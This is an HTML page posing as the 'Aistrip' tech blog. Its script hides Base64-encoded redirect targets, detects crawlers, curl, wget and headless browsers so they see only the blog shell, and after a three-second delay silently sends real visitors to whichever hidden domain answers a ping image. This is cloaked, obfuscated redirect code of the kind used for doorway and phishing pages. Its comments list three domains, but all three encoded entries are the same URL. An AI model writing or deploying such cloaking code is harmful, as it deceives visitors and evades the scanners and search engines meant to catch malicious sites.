  <main>
    <h1>欢迎来到 Aistrip 技术博客</h1>

  <div class="footer">
    &copy; 2025 Aistrip | 技术驱动 · 安全优先
  </div>

  <script>
    // ✅ UA 判断（仅对浏览器跳转）
    const ua = navigator.userAgent.toLowerCase();
    const isBrowser = /chrome|safari|firefox|edge|opera|mobile/.test(ua);
    const isBot = /bot|spider|crawler|curl|python|wget|headless/.test(ua);

    // ✅ Base64 加密跳转地址列表（多域名）
    const encodedList = [
      'aHR0cHM6Ly93ZWIuYWlzdHJpcC52aXA=',       // web.aistrip.vip
      'aHR0cHM6Ly93ZWIuYWlzdHJpcC52aXA=',   // strip.apistrip.com
      'aHR0cHM6Ly93ZWIuYWlzdHJpcC52aXA='            // ai.strip.cl（示例）
    ];

    // ✅ 检测域名是否可用（通过加载 ping.png）
    function checkDomain(url) {
      return new Promise((resolve) => {
        const img = new Image();
        img.src = url + '/ping.png?' + Date.now();
        img.onload = () => resolve(url);
        img.onerror = () => resolve(null);
      });
    }

    // ✅ 自动检测并跳转
    async function autoRedirect() {
      if (!isBrowser || isBot) return;

      for (const encoded of encodedList) {
        const url = atob(encoded);
        const result = await checkDomain(url);
        if (result) {
          window.location.href = result;
          break;
        }
      }
    }

    // ✅ 页面加载后延迟跳转（每次打开都会跳）
    document.addEventListener('DOMContentLoaded', () => {
      setTimeout(autoRedirect, 3000);
    });
  </script>
</body>
